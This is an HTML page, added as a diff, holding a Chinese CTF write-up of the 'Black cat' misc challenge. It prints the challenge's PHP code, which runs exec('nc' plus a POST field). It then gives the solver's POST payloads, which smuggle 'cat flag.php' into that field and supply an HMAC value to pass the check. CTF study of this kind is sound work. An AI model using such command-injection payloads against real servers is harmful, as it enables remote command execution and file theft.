@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>buuctf-misc-三 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="羊城杯 – Black cat打开网页源码下载音乐附件，用010打开，发现文章最后有一段代码  12345678910111213141516171819if(empty($_POST[&amp;#x27;Black-Cat-Sheriff&amp;#x27;]) || empty($_POST[&amp;#x27;One-ear&amp;#x27;]))&amp;#123;    die(&amp;#x27;1&amp;#x27;);&amp;#125;$c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-misc-三">
+<meta property="og:url" content="http://example.com/2021/09/08/buuctf/buuctf-misc-%E4%B8%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="羊城杯 – Black cat打开网页源码下载音乐附件，用010打开，发现文章最后有一段代码  12345678910111213141516171819if(empty($_POST[&amp;#x27;Black-Cat-Sheriff&amp;#x27;]) || empty($_POST[&amp;#x27;One-ear&amp;#x27;]))&amp;#123;    die(&amp;#x27;1&amp;#x27;);&amp;#125;$c">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/john/Desktop/大学/网安/HEXO/source_posts/buuctf-misc-三/QQ截图20210908180329.png">
+<meta property="og:image" content="c:/Users/john/Desktop/大学/网安/HEXO/source_posts/buuctf-misc-三/QQ图片20210910105523.png">
+<meta property="og:image" content="c:/Users/john/Desktop/大学/网安/HEXO/source_posts/buuctf-misc-三/QQ图片20210910110033.png">
+<meta property="article:published_time" content="2021-09-08T09:50:11.000Z">
+<meta property="article:modified_time" content="2021-09-10T03:09:05.947Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/john/Desktop/大学/网安/HEXO/source_posts/buuctf-misc-三/QQ截图20210908180329.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-buuctf/buuctf-misc-三" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/08/buuctf/buuctf-misc-%E4%B8%89/" class="article-date">
+  	<time datetime="2021-09-08T09:50:11.000Z" itemprop="datePublished">2021-09-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      buuctf-misc-三
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="羊城杯-–-Black-cat"><a href="#羊城杯-–-Black-cat" class="headerlink" title="羊城杯 – Black cat"></a>羊城杯 – Black cat</h2><p>打开网页源码下载音乐附件，用010打开，发现文章最后有一段代码</p>
+<p><img src="C:\Users\john\Desktop\大学\网安\HEXO\source_posts\buuctf-misc-三\QQ截图20210908180329.png" alt="QQ截图20210908180329"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if(empty($_POST[&#x27;Black-Cat-Sheriff&#x27;]) || empty($_POST[&#x27;One-ear&#x27;]))&#123;</span><br><span class="line">    die(&#x27;1&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(&quot;clandestine&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;White-cat-monitor&#x27;]))</span><br><span class="line">    $clandestine = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;White-cat-monitor&#x27;], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;One-ear&#x27;], $clandestine);</span><br><span class="line"></span><br><span class="line">if($hh !== $_POST[&#x27;Black-Cat-Sheriff&#x27;])&#123;</span><br><span class="line">    die(&#x27;2&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo exec(&quot;nc&quot;.$_POST[&#x27;One-ear&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>要RCE，首先需要满足Black-Cat-Sheriff 和 One-ear 不为空，并且 $hh !== $_POST[‘Black-Cat-Sheriff’]， 然后执行exec(“nc”.$_POST[‘One-ear’]);，参数可控，hh 就是php解析器根据我们输入的内容生成的并赋值的，Black-Cat-Sheriff 是我们自己传的参数</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/117446418">https://blog.csdn.net/LYJ20010728/article/details/117446418</a></p>
+<p>修改代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$clandestine = getenv(&quot;clandestine&quot;);  //添加回显</span><br><span class="line">echo $clandestine;</span><br></pre></td></tr></table></figure>
+
+<p>用POST传入参数，绕过第一个if</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Black-Cat-Sheriff=sjsjj&amp;One-ear=sjjajaajsn</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\john\Desktop\大学\网安\HEXO\source_posts\buuctf-misc-三\QQ图片20210910105523.png" alt="QQ图片20210910105523"></p>
+<p>发现clandestine是空的</p>
+<p>修改代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;White-cat-monitor&#x27;]))</span><br><span class="line">    $clandestine = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;White-cat-monitor&#x27;], NULL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;One-ear&#x27;], $clandestine);</span><br><span class="line">echo $hh;</span><br><span class="line"></span><br><span class="line">if($hh !== $_POST[&#x27;Black-Cat-Sheriff&#x27;])&#123;</span><br><span class="line">    die(&#x27;2&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>传入参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">White-cat-monitor=wer&amp;One-ear=cat flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\john\Desktop\大学\网安\HEXO\source_posts\buuctf-misc-三\QQ图片20210910110033.png" alt="QQ图片20210910110033"></p>
+<p>再次传入参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Black-Cat-Sheriff=b613679a0814d9ec772f95d778c35fc5ff1697c493715653c6c712144292c5ad</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="hash-hmac"><a href="#hash-hmac" class="headerlink" title="hash_hmac"></a>hash_hmac</h3><p>在php中hash_hmac函数就能将HMAC和一部分哈希加密算法相结合起来实现HMAC-SHA1  HMAC-SHA256 HMAC-MD5等等算法。函数介绍如下：<br>string hash_hmac(string $algo, string $data, string $key, bool $raw_output = false)<br>algo：要使用的哈希算法名称，可以是上述提到的md5,sha1等<br>data：要进行哈希运算的消息，也就是需要加密的明文。<br>key：使用HMAC生成信息摘要是所使用的密钥。<br>raw_output：该参数为可选参数，默认为false，如果设为true，则返回原始二进制数据表示的信息摘要，否则返回16进制小写字符串格式表示的信息摘要（注意是16进制数，而非简单的字母加数字）。<br>另外：如果algo参数指定的不是受支持的算法，将返回false。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/dengjiexian123/article/details/53313913">https://blog.csdn.net/dengjiexian123/article/details/53313913</a></p>
+<h3 id="isset-函数"><a href="#isset-函数" class="headerlink" title="isset () 函数"></a><strong>isset ()</strong> 函数</h3><p>用于检测变量是否已设置并且非 NULL。</p>
+<p>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。</p>
+<p>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p>
+<p>同时要注意的是 null 字符（”\0”）并不等同于 PHP 的 NULL 常量。</p>
+<h3 id="exec函数族"><a href="#exec函数族" class="headerlink" title="exec函数族"></a>exec函数族</h3><p>可以根据指定的文件名或目录名找到可执行文件，并用它来取代原调用进程的数据段、代码段和堆栈段。在执行完后，原调用进程的内容除了进程号外，其它全部被新程序的内容替换了。另外，这里的可执行文件既可以是二进制文件，也可以是Linux下任何可执行脚本文件。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/09/26/%E6%9C%88%E9%A5%BC%E6%9D%AFmisc/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          月饼杯misc
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/09/07/buuctf/misc/buuctf-misc-%E4%BA%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">buuctf misc (二)</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="buuctf/buuctf-misc-三" data-title="buuctf-misc-三" data-url="http://example.com/2021/09/08/buuctf/buuctf-misc-%E4%B8%89/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="buuctf-misc-三">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
